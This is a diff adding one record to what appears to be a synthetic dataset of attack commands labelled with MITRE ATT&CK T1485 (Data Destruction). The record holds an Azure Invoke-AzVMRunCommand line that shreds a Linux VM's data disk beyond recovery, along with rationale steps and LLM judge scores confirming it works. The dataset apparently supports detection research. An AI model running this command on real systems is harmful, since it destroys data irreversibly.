@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Archive' -Name 'LinVM-Archive' -CommandId 'RunShellScript' -ScriptString \"shred -v -n 3 -z /dev/sdc\"",
+  "explanation": "Overwrites the entire data disk /dev/sdc on a Linux VM with multiple passes, destroying all data on that targeted disk.",
+  "rationale_steps": [
+    "Identify the specific attached data disk (/dev/sdc) used for archives.",
+    "Overwrite the block device with multiple passes and a final zero pass to prevent recovery."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-19276e27",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax for Invoke-AzVMRunCommand, correct parameter names, balanced quotes, and a valid embedded Linux shred command with appropriate flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by using the shred utility with multiple passes (-n 3) and zero-filling (-z) to securely and permanently destroy all data on the specified disk (/dev/sdc) in a manner that prevents recovery.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T01:09:13.543755Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command and the embedded shell script are both perfectly well-formed with balanced quotes and valid flag formats.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly uses `Invoke-AzVMRunCommand` to execute `shred -v -n 3 -z /dev/sdc`, which is the appropriate tool and arguments to securely overwrite an entire disk device on a Linux VM, perfectly aligning with Data Destruction (T1485).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:09:20.893899Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid Azure PowerShell cmdlet with correct parameters and balanced quoting, and the embedded shred command uses proper flags.",
+        "semantic_score": 5,
+        "semantic_justification": "RunShellScript runs as root on the Linux VM and executes 'shred -v -n 3 -z /dev/sdc', which overwrites the target disk and achieves data destruction consistent with T1485.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:09:36.130462Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
